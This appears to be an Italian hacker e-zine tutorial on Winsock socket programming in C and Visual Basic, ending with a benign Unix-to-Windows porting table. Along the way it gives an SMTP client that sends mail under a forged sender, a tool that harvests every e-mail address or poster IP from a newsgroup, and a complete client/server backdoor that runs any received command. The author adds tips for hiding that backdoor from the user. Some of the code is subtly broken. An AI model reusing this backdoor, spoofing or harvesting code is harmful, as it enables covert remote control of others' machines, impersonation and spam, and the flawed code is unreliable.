    char stringa[0xff], invio[3];
     ...
    strcpy(stringa,"MAIL FROM: me@too.it");
    invio[0]=13;invio[1]=10;
     ...
    send(pippo,stringa,strlen(stringa),0);  
    send(pippo,invio,2,0);
     ...

    esempio pratico di ricezione:

    Vogliamo ricevere la risposta del server:

    qui occorre puntualizzare una cosa, non conviene cercare di ricevere una
    grossa mole di dati per volta, meglio suddividere tutto in pacchetti piu'
    piccoli da salvare o visualizzare volta volta.

     ...
    char ricevo[2000];
     ...
    recv(pippo,ricevo,2000,0)

    ovviamente l'istruzione recv mette in attesa il programma (non prosegue
    sino a quando la ricezione e' finita)
    
    Un esempio semplice pratico e funzionante da fare subito con poco
    dispendio di energie.

    Volete sapere che ore sono con precisione??  lo chiediamo all'orologio
    atomico del CNR?

    SIII...

    E' un servizio molto semplice ..potete fare la prova con telnet: vi
    collegate all'ip 155.253.17.2 sulla porta 13 e automaticamente vi verra'
    risposto con l'ora e la data precise aggiornate su i vostri dati (la
    data, l'ora e l'ora legale vengono replicate da server sulla base dell'ip
    col quale vi connettete)

    quindi .. telnet 155.253.17.2 13 ..  e vi appare l'ora e la data.

    Vediamo come possiamo fare per fare un programma che faccia la stessa cosa
    in c++.

  gli header necessari

 #include <stdio.h>
 #include <string.h>

  compreso quello del winsock..

 #include <winsock.h>

  main() 
   {

 si dichiarano le variabili necessarie

   WSAData a;
   SOCKET b;
   long gg;
   struct sockaddr_in c;
   int d,n,m;
   char e[0xff];

 si inizializza il winsock

  gg=WSAStartup(0x0101,&a);
    
 si dichiara la porta 13

  c.sin_family = AF_INET;
  c.sin_port = htons(13);

 si dichiara l'ip del server

  c.sin_addr.s_addr = inet_addr("155.253.17.2");
   
 ci si connette
    
  d=connect(b,(struct sockaddr *)&c,sizeof(c));

 si riceve la stringa di dati contenente l'ora

  n=recv(b,e,sizeof(e),0);

 la si visualizza sulla consolle

   for(m=1;m<=n; m++)
    printf("%c",e[m-1]);
   printf("\n");

 da bravi bambini si chiude il socket. ;-)

  closesocket(b);
}

 finito.

  il programma e' tutto qui:

//-----------------------------------------------------
#include <stdio.h>
#include <string.h>
#include <winsock.h>
main()
{
  WSAData a;
  SOCKET b;
  long gg;
  struct sockaddr_in pippo;
  int d,n,m;
  char e[0xff];
  gg=WSAStartup(0x0101,&a);
  b = socket(AF_INET,SOCK_STREAM,0);
  pippo.sin_family = AF_INET;
  pippo.sin_port = htons(13);
  pippo.sin_addr.s_addr = inet_addr("155.253.17.2");
  d=connect(b,(struct sockaddr *)&pippo,sizeof(pippo));
  n=recv(b,e,sizeof(e),0);
   for(m=1;m<=n; m++)
    printf("%c",e[m-1]);
   printf("\n");
  closesocket(b);
}
//-----------------------------------------------------

  ovviamente questo e' il METODO GENERALE di uso dei socket..
  dovendo programmare la stessa cosa in VB (o altro linguaggio) non ci
  sarebbe nessuna differenza strutturale sostanziale..

  vediamo infatti l'equivalente del programma sopra riportato in VB usando al
  posto del winsock.h la libreria WINSOCK.BAS scaricabile gratuitamente in
  rete un po' dappertutto.
  Cio' permette di evitare l'uso delle librerie activex tipo winsock.ocx o
  winsck.ocx che richiedono all'utente finale sia il possesso che una
  preventiva registrazione per funzionare.
  Il programma VB cosi' ottenuto sara' (runtime escluse) autosufficiente.
  
//-----------------------------------------------------
Dim a As WSADataType
Dim b,gg As Long
Dim pippo As sockaddr
Dim e As String * 255

Private Sub Form_Load()
    gg = WSAStartup(&H101, a)
    b = socket(AF_INET, SOCK_STREAM, 0)
    If SOCKN = SOCKET_ERROR Then Exit Sub
    pippo.sin_family = AF_INET
    pippo.sin_port = htons(13)
    pippo.sin_addr = inet_addr("155.253.17.2")
    pippo.sin_zero = String$(8, 0)
    d = connect(b, pippo, Len(pippo))
    n = recv(b, e, 255, 0)
    Text1.text = e
    closesocket b
    ' RC = WSACleanup()
End Sub
//-----------------------------------------------------

   Se si escludono le piccole variazioni dovute alle differenze intrinseche
   dei due diversi linguaggi si puo' notare che l'evolversi della struttura
   organizzativa del programma e' praticamente la stessa.
   In Pascal la cosa non sarebbe a sua volta molto differente.

 Per inciso le procedure della libreria winsock.bas (circa 40k di dimensione
 totale) che servono a questo programma sono veramente poche..

 Volendo solo accludere un modulo fatto ad hoc estrapolando solo lo
 strettamente necessario alla compilazione al posto di winsock.bas uniremo
 questo MINIWINSOCK.BAS studiato ad arte..

 [ ATTENZIONE perche' funziona SOLO con il programma sopra.. ]

-------------------------------------------------------------- MINIWINSOCK.BAS
' --------------------------------------
' dichiarazione delle costanti
' --------------------------------------
Public Const WSA_DESCRIPTIONLEN = 256
Public Const WSA_DescriptionSize = WSA_DESCRIPTIONLEN + 1
Public Const WSA_SYS_STATUS_LEN = 128
Public Const WSA_SysStatusSize = WSA_SYS_STATUS_LEN + 1
Public Const AF_INET = 2
Public Const SOCK_STREAM = 1
Public Const SOCKET_ERROR = -1
' --------------------------------------
' dichiarazione delle strutture
' --------------------------------------
Type WSADataType
    wVersion As Integer
    wHighVersion As Integer
    szDescription As String * WSA_DescriptionSize
    szSystemStatus As String * WSA_SysStatusSize
    iMaxSockets As Integer
    iMaxUdpDg As Integer
    lpVendorInfo As Long
End Type
Type sockaddr
    sin_family As Integer
    sin_port As Integer
    sin_addr As Long
    sin_zero As String * 8
End Type
' --------------------------------------
' dichiarazione delle procedure
' --------------------------------------
Public Declare Function WSAStartup _
Lib "Winsock.dll" ( _
                           ByVal wVR As Integer, _
                           lpWSAD As WSADataType _
                          ) As Integer
Public Declare Function socket _
Lib "Winsock.dll" ( _
                           ByVal af As Integer, _
                           ByVal s_type As Integer, _
                           ByVal protocol As Integer _
                          ) As Integer

Public Declare Function connect _
Lib "Winsock.dll" ( _
                           ByVal s As Integer, _
                           addr As sockaddr, _
                           ByVal namelen As Integer _
                           ) As Integer
Public Declare Function recv _
Lib "Winsock.dll" ( _
                           ByVal s As Integer, _
                           ByVal buf As Any, _
                           ByVal buflen As Integer, _
                           ByVal flags As Integer _
                          ) As Integer
Public Declare Function htons _
Lib "Winsock.dll" ( _
                          ByVal hostshort As Integer _
                         ) As Integer
Public Declare Function inet_addr _
Lib "Winsock.dll" ( _
                          ByVal cp As String _
                         ) As Long
Public Declare Function closesocket _
Lib "Winsock.dll" ( _
                           ByVal s As Integer _
                          ) As Integer
Public Declare Function WSACleanup _
Lib "Winsock.dll" ( _
                          ) As Integer
------------------------------------------------------------------------------

  un altro esempio pratico.. mandiamo una mail al nostro amico
  topolino@uccio.it dicendogli che e' un penecefalo. Useremo il nostro
  server mail  123.345.567.890 sulla porta 25 e faremo finta di essere
  cuccurullo@tin.it

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dos.h>
#include <conio.h>
#include <winsock.h>

WSAData ws;
SOCKET s;
struct sockaddr_in sock;
int d,n,m;
long gg;
char stringa[4096], stringhina[3];
stringhina[0]=0x0d;stringhina[1]=0x0a;

main()
{
 strcpy(stringa,"HELO sono-io");
                send(s,stringa,strlen(stringa),0);  // manda la stringa al server
                send(s,stringhina,2,0);             // manda l'invio (ENTER)
                printf("%s : ",stringa);            // visualizza la stringa inviata
                recv(s,stringa,4096,0);             // riceve la risposta dal server
                printf("%s\n",stringa);             // la visualizza
 strcpy(stringa,"MAIL FROM:: cuccurullo@tin.it");
                send(s,stringa,strlen(stringa),0);  // manda la stringa al server
                send(s,stringhina,2,0);             // manda l'invio (ENTER)
                printf("%s : ",stringa);            // visualizza la stringa inviata
                recv(s,stringa,4096,0);             // riceve la risposta dal server
                printf("%s\n",stringa);             // la visualizza
 strcpy(stringa,"RCPT TO: topolino@uccio.it");
                send(s,stringa,strlen(stringa),0);  // manda la stringa al server
                send(s,stringhina,2,0);             // manda l'invio (ENTER)
                printf("%s : ",stringa);            // visualizza la stringa inviata
                recv(s,stringa,4096,0);             // riceve la risposta dal server
                printf("%s\n",stringa);             // la visualizza
 strcpy(stringa,"DATA");
                send(s,stringa,strlen(stringa),0);  // manda la stringa al server
                send(s,stringhina,2,0);             // manda l'invio (ENTER)
                printf("%s\n",stringa);             // visualizza la stringa inviata
 strcpy(stringa,"Subject: ciao da cuccurullo!");
                send(s,stringa,strlen(stringa),0);  // manda la stringa al server
                send(s,stringhina,2,0);             // manda l'invio (ENTER)
                send(s,stringhina,2,0);             // manda l'invio (ENTER)
                printf("%s\n\n",stringa);           // visualizza la stringa inviata
 strcpy(stringa,"Ma lo sai che sei un bel penecefalo!? ;-)");
                send(s,stringa,strlen(stringa),0);  // manda la stringa al server
                send(s,stringhina,2,0);             // manda l'invio (ENTER)
                send(s,stringhina,2,0);             // manda l'invio (ENTER)
                printf("%s\n\n",stringa);           // visualizza la stringa inviata
 strcpy(stringa,".");    
                send(s,stringa,strlen(stringa),0);  // manda la stringa al server
                send(s,stringhina,2,0);             // manda l'invio (ENTER)
                printf("%s : ",stringa);            // visualizza la stringa inviata
                recv(s,stringa,4096,0);             // riceve la risposta dal server
                printf("%s\n",stringa);             // la visualizza

  // dopo il comando DATA non si ricevono messaggi dal server smtp fino alla
  // chiusura con . + ENTER quindi l'uso del receive farebbe bloccare il
  // programma in una continua ricerca di un qualcosa che non verra' mai. ;-)
 
 closesocket(s);
}

  Ultimo esempio concernete i ng..

  Essendo dei veri cerebrolesi ovviamente vi sarete chiesti come fare per
  levare da un ng tutte le mail in esso contenute. :))
  
  Eccovi un esempio banale per estrarre tutte le mail dal newsgroup 
  alt.hacker.cough.cough su news.interbusiness.it

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dos.h>
#include <conio.h>
#include <windows.h>
#include <winsock.h>

WSAData ws;
SOCKET s;
struct sockaddr_in sock;
struct hostent *hp;
int d,n,m;
long gg;
char stringa[4096], stringhina[3];

Spedisci_Messaggio(char *messaggio);     // procedure per semplificare l'invio
Ricevi_Risposte();                       // la ricezione e la visualizzazione 

main()
{

 gg=WSAStartup(0x0101,&ws);                  // inizializzo il winsock
 s = socket(AF_INET,SOCK_STREAM,0);
 hp=gethostbyname("news.interbusiness.it");  // trovo l'ip dal nome dichiarato
        if(hp==NULL) {closesocket(s);exit(0);}     // se non c'e'..termina il
                                                   // programma.
  sock.sin_family = AF_INET;   
  sock.sin_port = htons(119);			   
  sock.sin_addr.s_addr = ((struct in_addr *)(hp->h_addr))->s_addr;
  d=connect(s,(struct sockaddr *)&sock,sizeof(sock));
  Ricevi_Risposte();printf("\n");

  // trova tutti gli indirizzi email sul ng
  Spedisci_Messaggio("group alt.hackers.cough.cough.cough");
  strcpy(stringa,"->");
  Spedisci_Messaggio("xhdr from 1-100000");
                                          // 1-1000000 equivale a dire -tutti-
  while(!strstr(stringa, "\n.\r"))
  Ricevi_Risposte();
  printf("\n");
  closesocket(s);
  getch();
  exit(0);
}

Spedisci_Messaggio(char *messaggio){
 send(s,messaggio,strlen(messaggio),0);
 stringhina[0]=0x0d;stringhina[1]=0x0a;
 send(s,stringhina,2,0);}

Ricevi_Risposte(){
 n=recv(s,stringa,sizeof(stringa),0);
 for ( m = 1;m <= n; m++)
 printf("%c",stringa[m-1]);}

 L'esempio sfrutta il protocollo nntp.
 Per avere la lista di tutti i i diversi header K presenti su un gruppo di
 articoli da A a B su un determinato ng e' sufficiente collegarsi al
 newserver, selezionare il gruppo con GROUP nome_del_newsgroup e di seguito
 se ad esempio si bogliono estrarre tutte le mail presenti (quindi l'header
 from: ) si digitera' su telnet

  > xhdr from A B 

 per avere altri header la dicitura e' analoga..

 per avere tutti i subject degli articoli:

 > xhdr subject 1 100000

 per avere tutti gli ip presenti nel ng dall'articolo 4000 all'articolo 4100

 > xhdr nntp-posting-host 4000 4100

 ecc...

   eccovi un esempio piu' evoluto del programma di sopra.

 l'ho chiamato FINDUS (trovaci) 

  permette di estrarre da un determinato NG su un particolare NS la lista
  completa di tutti gli header dichiarati in entrata.

  es.. per estrarre tutte le mail dal ng alt.hackers da news.tin.it si
  procedera' cosi':

 [ sintassi:  FINDUS  news_server  news_group  header ]

 FINDUS news.tin.it alt.hackers from  > lista.txt

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 FINDUS.C
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dos.h>
#include <conio.h>
#include <windows.h>
#include <winsock.h>

// Assegnazioni
//---------------------------------------------------------------------------
WSAData ws;
SOCKET s;
struct sockaddr_in sock;
struct hostent *hp;
int d,n,m;
long gg;
char stringa[4096], stringhina[3],s1[255];
//---------------------------------------------------------------------------

// Dichiarazione delle procedure
//---------------------------------------------------------------------------
Spedisci_Messaggio(char *messaggio);
Spedisci_ENTER();
Ricevi_Risposte();
//---------------------------------------------------------------------------

main(int nf,char **file)
{
char *leggi;
FILE *fp;

leggi = (char *) calloc(200, sizeof(char));

//fp=fopen(file[1],"rb");

// inizializzazione del winsock
//---------------------------------------------------------------------------
gg=WSAStartup(0x0101,&ws);
printf("Attivo il supporto winsock  -> id=%ld\n",gg);
s = socket(AF_INET,SOCK_STREAM,0);
printf("Apro il socket n.%ld\n",s);

hp=gethostbyname(file[1]);
 if(hp==NULL){
   printf("mica lo trovo %s!\n",file[1]);
   closesocket(s);
   exit(0);}

// dichiarazione della porta e dell'host a cui connettersi
sock.sin_family = AF_INET;
sock.sin_port = htons(119);
sock.sin_addr.s_addr = ((struct in_addr *)(hp->h_addr))->s_addr;

// connessione
d=connect(s,(struct sockaddr *)&sock,sizeof(sock));
printf("Sono connesso  -> id=%ld\n",d);

//---------------------------------------------------------------------------
 Ricevi_Risposte();
  printf("\n");

 // trova tutti gli header specificati
  sprintf(s1,"group %s",file[2]);
  Spedisci_Messaggio(s1);
  strcpy(stringa,"->");
  sprintf(s1,"xhdr %s 1-100000",file[3]);
  Spedisci_Messaggio(s1);
  while(!strstr(stringa, "\n.\r"))Ricevi_Risposte();
  printf("\n");
 closesocket(s);
 exit(0);

// Procedure utilizzate :
//---------------------------------------------------------------------------

// Procedura per spedire un messaggio al server con CrLf finale
//---------------------------------------------------------------------------
Spedisci_Messaggio(char *messaggio)
{
 send(s,messaggio,strlen(messaggio),0);
 stringhina[0]=0x0d;stringhina[1]=0x0a;
 send(s,stringhina,2,0);
}
//---------------------------------------------------------------------------


// Procedura per attendere e visualizzare la risposta del server
// .. paragonabile all'evento Data_Arrival (o quasi) :)
//---------------------------------------------------------------------------
Ricevi_Risposte()
{
 n=recv(s,stringa,sizeof(stringa),0);
 for ( m = 1;m <= n; m++)
 printf("%c",stringa[m-1]);

}
//---------------------------------------------------------------------------
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


  ok.


 Vediamo adesso qualcosa di leggermente piu' complesso.
 
 per un server in c++ vi rimando alla lettura del mio articolo su Netrunner9
 "Anche la programmazione ha il suo sgurtz" dove ci sono tutte le istruzioni
 per farne uno completo ed efficiente.

 Proviamo allora a farne uno in VB .. un semplice esecutore di programmi da
 remoto col winsock.bas

 la vostra prima applicazione client-server tipo backdoor. ;-)

 (Per avere un solo eseguibile consiglio di compilarlo in VB4 32bit per poi
  unire le runtime library in un unico eseguibile seguendo le istruzioni del
  mio programma STEALTH INSTALLER 2 che trovate su www.spippolatori.com)

  Specifiche :       Trasmissione dei dati via TCP
                     Uso della porta 666 per le comunicazioni
           
 Cominciamo col Client:

 Il programma che dovra' connettersi al server inviando la stringa contenente
 il nome del programma da far eseguire sul computer remoto.

 Aprite un form con due textbox (la prima chiamatela "host" e conterra' l'ip
 del computer remoto a cui ci si vorra' connettere e la seconda chiamatela
 "Program"; quest'ultima conterra' il nome del file da eseguire completo del
 path che  -dovrebbe- trovarsi sulla macchina remota.)
 Unite un bottone per l'avvio della procedura di connessione.

--------------------------------------------- client
Dim INIZIO As WSADataType
Dim SOCKN As Long
Dim pippo As sockaddr

Private Sub Form_Load()
    RC = WSAStartup(&H101, INIZIO)
    If RC = SOCKET_ERROR Then Exit Sub
End Sub

Private Sub Form_Unload(Cancel As Integer)
    RC = WSACleanup()
End Sub

Private Sub Button_Click()
    Dim IPN As Long
    IPN = GetHostByNameAlias(Host)
    If IPN = -1 Then Exit Sub
    SOCKN = socket(AF_INET, SOCK_STREAM, 0)
    If SOCKN = SOCKET_ERROR Then Exit Sub
    pippo.sin_family = AF_INET
    pippo.sin_port = htons(666)
    pippo.sin_addr = IPN
    pippo.sin_zero = String$(8, 0)
    RC = connect(SOCKN, pippo, Len(pippo))
    If RC = SOCKET_ERROR Then
    closesocket SOCKN
    Exit Sub
    End If
    RC = SendData(SOCKN, Program + vbCrLf)
    closesocket SOCKN
End Sub
--------------------------------------------- client

 adesso il Server:
 
    PID = WSAStartup(&H101, INIZIO)
    If PID = SOCKET_ERROR Then Exit Sub
    ..
    SOCKN = socket(AF_INET, SOCK_STREAM, 0)
    If SOCKN < 1 Then Exit Sub
    pippo.sin_family = AF_INET
    pippo.sin_port = htons(666)
    pippo.sin_addr = 0
    pippo.sin_zero = String$(8, 0)
 
    fin qui niente di nuovo.

    id = bind(SOCKN, pippo, sockaddr_size)
  
    una nuova funzione necessaria al server. BIND
    Col termine -binding- si intende l'associazione di un determinato
    indirizzo IP (il nostro) porta compresa ad un sock prestabilito al fine
    di aprire una via di comunicazione nei due sensi.
   
    If id <> 0 Then id = WSACleanup() : Exit Sub
    (se l'associazione per un qualche motivo non riesce il programma si
    chiude)
   
    ascolta = 2
    id = listen(ByVal SOCKN, ByVal ascolta)

    Apertura definitiva della porta dichiarata tramite la struttura pippo e 
    messa in ascolto (LISTEN) del server. (sono permessi 2 utenti
    contemporaneamente)
    
    A questo punto il server attende di ricevere dati sulla porta prefissata.

    Il sistema che ho usato per ottenere le informazioni richieste usa questa
    funzione del winsock:

    WSAAsyncSelect

    All'atto della ricezione  WSAAsyncSelect spedisce un messaggio ad una
    casella aperta sul nostro form identificandola tramite il suo handle. 
    Aprendo due caselle con evento Mouse-up ed inviando a queste come
    messaggio &H202 (che corrisponde appunto al Mouse_up ..ovvero al rilascio
    del tasto select del mouse dopo averlo premuto) si avra' l'attivazione
    sequenziale delle due procedure collegate.

    la prima la chiameremo "riceve"

  Private Sub riceve_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    RICEVUTO = ""
    LEGGI = accept(SOCKN, pippo2, Len(pippo2))
    id = WSAAsyncSelect(LEGGI, richiede.hWnd, ByVal &H202, ByVal FD_READ Or FD_CLOSE)
  End Sub

    con accept si dichiara di voler "accettare" la connessione in arrivo dal
    client.

    e la seconda la chiameremo richiede

Private Sub richiede_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Bytes = recv(LEGGI, TESTO, 2048, 0)
    If Bytes <> 0 Then
        RICEVUTO = RICEVUTO + Left$(TESTO, Bytes)
    ElseIf WSAGetLastError() <> WSAEWOULDBLOCK Then
        id = WSAAsyncSelect(SOCKN, riceve.hWnd, ByVal &H202, ByVal FD_CONNECT Or FD_ACCEPT)
        If InStr(RICEVUTO, Chr$(13)) <> 0 Then
            RICEVUTO = Left$(RICEVUTO, InStr(RICEVUTO, Chr$(13)) - 1)
        End If
        On Error Resume Next
        id = Shell(RICEVUTO, 1)
        closesocket (LEGGI)
    End If
End Sub

  Con questa procedura (attiva subito dopo il riceve grazie all'evento
  postato dal WSAASyncSelect) si legge (tramite il recv .. recv(LEGGI, TESTO,
  2048, 0)) la stringa di testo inviata dal client contenente il programma da
  eseguire... quindi col comando SHELL si esegue.

  Il programma server e' questo:

 Si apre un form sul quale si inseriscono due testbox rinominandole
 "riceve" e "richiede" (piccole a piacere tanto on servono a nulla se non
 alla verifica degli eventi inviati da WSAAsyncSelect)
 ..volendo e' possibile applicare a piacere tutte le soluzioni note per
 rendere invisibile il form.. dalla semplice disattivazione del parametro
 "Visibile nella Task bar" alla eliminazione dall lista dei task.. vedere per
 questo il mio articolo precedente su Netrunner "il programma invisibile"

--------------------------------------------- server
Dim INIZIO As WSADataType
Dim SOCKN As Long
Dim LEGGI As Long
Dim pippo As sockaddr
Dim pippo2 As sockaddr
Dim TESTO As String * 2048
Dim RICEVUTO As String

Private Sub Form_Load()
    PID = WSAStartup(&H101, INIZIO)
    If PID = SOCKET_ERROR Then Exit Sub
    Dim ascolta As Integer
    Dim nome As String
    Dim lungo As Integer
    RICEVUTO = ""
    SOCKN = socket(AF_INET, SOCK_STREAM, 0)
    If SOCKN < 1 Then Exit Sub
    pippo.sin_family = AF_INET
    pippo.sin_port = htons(666)
    pippo.sin_addr = 0
    pippo.sin_zero = String$(8, 0)
    id = bind(SOCKN, pippo, sockaddr_size)
    If id <> 0 Then id = WSACleanup() : Exit Sub
    ascolta = 2
    id = listen(ByVal SOCKN, ByVal ascolta)
    id = WSAAsyncSelect(SOCKN, riceve.hWnd, ByVal &H202, ByVal FD_CONNECT Or FD_ACCEPT)
    nome = GetLocalHostName + " (" + AddrToIP(GetLocalHostName) + ")"
End Sub

Private Sub Form_Unload(Cancel As Integer)
    PID = WSACleanup()
End Sub

Private Sub riceve_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    RICEVUTO = ""
    LEGGI = accept(SOCKN, pippo2, Len(pippo2))
    id = WSAAsyncSelect(LEGGI, richiede.hWnd, ByVal &H202, ByVal FD_READ Or FD_CLOSE)
End Sub

Private Sub richiede_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Bytes = recv(LEGGI, TESTO, 2048, 0)
    If Bytes <> 0 Then
        RICEVUTO = RICEVUTO + Left$(TESTO, Bytes)
    ElseIf WSAGetLastError() <> WSAEWOULDBLOCK Then
        id = WSAAsyncSelect(SOCKN, riceve.hWnd, ByVal &H202, ByVal FD_CONNECT Or FD_ACCEPT)
        If InStr(RICEVUTO, Chr$(13)) <> 0 Then
            RICEVUTO = Left$(RICEVUTO, InStr(RICEVUTO, Chr$(13)) - 1)
        End If
        On Error Resume Next
        id = Shell(RICEVUTO, 1)
        closesocket (LEGGI)
    End If
End Sub

--------------------------------------------- 

 .. per fare le prove sara' sufficiente chiamare sulla stessa macchina sia il
 server che il client. Mettere come IP locale 127.0.0.1 e come programma da
 eseguire c:\windows\calc.exe :))

          CONVERSIONE DI PROGRAMMI  ------------------------------------------
     ----------------------------------------------- UNIX -> WINDOWS

     XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
     X                                           X
     X   PICCOLA GUIDA AD USO DEL PROGRAMMATORE  X
     X                                           X
     XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

 Note per convertire un programma unix style in C trovato in giro per la rete
 nell'equivalente per windows.

 Non sempre si puo' fare semplicemente.. 
 esistono un paio di funzioni su unix difficilmente replicabili su windows..
 non e' che -non si puo' fare- solo che non e' cosi' semplice ed immediato
 come convertire una funzione in un altra equivalente solo modificando di
 poco la sintassi.
 (del resto su windows [almeno su NT!] e' possibile fare tutto cio' che si
 fa su unix e viceversa. Unix con x-windows ha recuperato il parco totale
 della Api32W e windows con NT ha attualmente un completo subset di istruzioni
 Api a standar POSIX esattamente come unix.)

 Prima di tutte la funzione Fork(). La cosa migliore quando trovate un
 programma col -fork- e' quella di tralasciarlo almeno fino a quando non
 avrete acquisito maggior pratica con i socket.
 E' possibile cmq (a livello conoscitivo) emulare la fork con istruzioni tipo
 "_beginthread" e la successiva apertura di un nuovo processo (exec()) con la
 Api CreateProcess().
 La difficolta' nella sostituzione per inciso deriva dall'incapacita' di unix
 di gestire i thread come invece fa windows.

 <NOTA TECNICA ON>
 -----------------------------------------------------------------------------
 per i piu' smaliziati un indizio .. la SDK di NT e' una miniera per questo
 tipo di informazioni.
 Questo e' il codice sorgente che riporta al fine di emularela funione fork()
 seguita da exec() esattamente come su unix.

 Success = CreateProcess((LPTSTR)IMAGENAME, (LPTSTR)CMDLINE,
        (LPSECURITY_ATTRIBUTES)NULL, (LPSECURITY_ATTRIBUTES)NULL,
        (BOOL)TRUE,(DWORD)0, NULL, NULL, (LPSTARTUPINFO)&SI,
        (LPPROCESS_INFORMATION)&pi);
 if (fSuccess) {           /* parent waits for child */
        hProcess = pi.hProcess;    hThread = pi.hThread;
        dw = WaitForSingleObject(hProcess, INFINITE);
        if (dw != 0xFFFFFFFF) { /* if we saw success ... */
                /* pick up an exit code for the process */
                fExit = GetExitCodeProcess(hProcess, &dwExitCode);
        }
        /* close the child process and thread object handles */
        CloseHandle(hThread);    CloseHandle(hProcess);
        printf("COMPLETED!\n");
 }
else    printf("Failed to CreateProcess\n");

 Se vi e' di difficile comprensione ... aspettate a capire cosa fa di preciso.
 Magari date una scorsa generale alla SDK che e' tutta salute. ;-)
------------------------------------------------------------------------------
 Quello che potete sostituire invece molto semplicemente:

 HEADER DA SOSTITUIRE:

 Su i programmi UNIX trovate questi Header per gestire i socket

-------------------------------
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <sys/ioctl.h> 
#include <sys/wait.h> 
#include <netdb.h> 
#include <unistd.h> 
#include <signal.h> 
-------------------------------

 sostituiteli integralamente su windows con

-------------------------------
#include <process.h> 
#include <winsock2.h>
-------------------------------

  (se non avete winsock2.h anche winsock.h per la maggior parte delle
  applicazioni va bene)

 Alcune funzioni generali sono simili ma la loro dicitura e' leggermente
 diversa

 Funzioni da sostituire

 UNIX                                 WINDOWS
 -----------------------------------------------------------------------------
 strdup()                             _strdup()
 -----------------------------------------------------------------------------
 strcasecmp()                         _stricmp()
 -----------------------------------------------------------------------------
 stricmp()                            _stricmp()
 -----------------------------------------------------------------------------
 iaascii()                            _isascii()
 -----------------------------------------------------------------------------

 da ricordare di trasformate tutti i

 UNIX                                 WINDOWS
 -----------------------------------------------------------------------------
 fopen(filename, "w");                fd = fopen(filename, "wb");
 -----------------------------------------------------------------------------
 ecc.. 
 -----------------------------------------------------------------------------

 la funzione BZERO in window non c'e'.. la si puo' sostituire con l'equivalente

 UNIX                                 WINDOWS
 -----------------------------------------------------------------------------
 bzero(NamedColors, sizeof(NamedColors); 
                                 emset(NamedColors, '\0', sizeof(NamedColors);
 -----------------------------------------------------------------------------

 stesso discorso per BCOPY

 UNIX                                 WINDOWS
 -----------------------------------------------------------------------------
 bcopy (ddata, sdata, ndata);         memcpy (ddata, sdata, ndata);
 -----------------------------------------------------------------------------

 Differenze tra le funzioni relative al winsock (socket) ed equivalenze per la
 sostituzione

 Tipo di variabile per i SOCKET:
 UNIX                                 WINDOWS
 -----------------------------------------------------------------------------
 int                                  SOCKET
 -----------------------------------------------------------------------------
 
 Errore di Socket non valido
 UNIX                                 WINDOWS
 -----------------------------------------------------------------------------
 -1                                   INVALID_SOCKET
 -----------------------------------------------------------------------------
 
 Chiusura del socket

 UNIX                                 WINDOWS
 -----------------------------------------------------------------------------
 close(int s)                         closesocket(SOCKET s)
 -----------------------------------------------------------------------------
 
 Controllo socket I/O
 UNIX                                 WINDOWS 
 -----------------------------------------------------------------------------
 ioctl(int s,int cmd,char *argp);
                              ioctlsocket(SOCKET s,long cmd,u_long FAR* argp);
 -----------------------------------------------------------------------------

 getsockopt

 UNIX                                 WINDOWS
 -----------------------------------------------------------------------------
 getsockopt(int s,int l,int o,void *op,int *ot);
                     getsockopt(SOCKET s,int l,int o,char FAR*op,int FAR* ot);
 -----------------------------------------------------------------------------
 
 setsockopt 

 UNIX                                 WINDOWS
 -----------------------------------------------------------------------------
 setsockopt(SOCKET s,int l,int o,const void *op,int ot);
                   setsockopt(SOCKET s,int l,int o,const char FAR *op,int ot);
 -----------------------------------------------------------------------------

   Quindi RICAPITOLANDO .. almeno per le funioni piu' importanti (gia questo
   vi permettera' di riconvertire -molti- programmi da linux a windows.) le
   tabella delle trasformazioni e' la seguente:

 -----------------------------------------------------------------------------
 UNIX                                 WINDOWS
 -----------------------------------------------------------------------------
 strdup()                             _strdup()
 -----------------------------------------------------------------------------
 strcasecmp()                         _stricmp()
 -----------------------------------------------------------------------------
 stricmp()                            _stricmp()
 -----------------------------------------------------------------------------
 iaascii()                            _isascii()
 -----------------------------------------------------------------------------
 fopen(filename, "w");                fd = fopen(filename, "wb");
 -----------------------------------------------------------------------------
 bzero(NamedColors, sizeof(NamedColors); 
                                memset(NamedColors, '\0', sizeof(NamedColors);
 -----------------------------------------------------------------------------
 bcopy (ddata, sdata, ndata);         memcpy (ddata, sdata, ndata);
 -----------------------------------------------------------------------------
 int                                  SOCKET
 -----------------------------------------------------------------------------
 -1                                   INVALID_SOCKET
 -----------------------------------------------------------------------------
 close(int s)                         closesocket(SOCKET s)
 -----------------------------------------------------------------------------
 ioctl(int s,int cmd,char *argp);     ioctlsocket(SOCKET s,long cmd,u_long FAR* argp);
 -----------------------------------------------------------------------------
 getsockopt(int s,int l,int o,void *op,int *ot);
                                      getsockopt(SOCKET s,int l,int o,char FAR*op,int FAR* ot);
 -----------------------------------------------------------------------------
 setsockopt(SOCKET s,int l,int o,const void *op,int ot);
                                      setsockopt(SOCKET s,int l,int o,const char FAR *op,int ot);
 -----------------------------------------------------------------------------

 Ultima cosa .. ma importante!
 Ricordatevi che UNIX non ha bisogno di inizializzate i socket!
 Non esistono quindi su unix funzioni tipo quelle di windows 

      ...

    WSAStartup    (per inizializzare il winsock)

      ...
   
    WSACleanup    (per chiderlo definitivamente)

      ...

  voi invece DOVETE mettercele altrimenti i programmi che convertirete non
  funzioneranno mai.

  Metterete ovviamente WSAStertup  come prima riga d'istruzione all'apertura
  del vostro programma modificato e WSACLeanup alla fine.. SEMPRE... non
  dimenticatevelo mai altrimenti avrete come risultato solo programmi
  perfettamente compilati ma che non serviranno ad altro che a farvi aspettare
  inutilmente qualcosa di incoraggiante davanti ad una consolle dos tutta
  nera. :))

  Fine.  .. ps: se siete arrivati fin qui a leggere forse non eravate dei
  cerebrolesi!

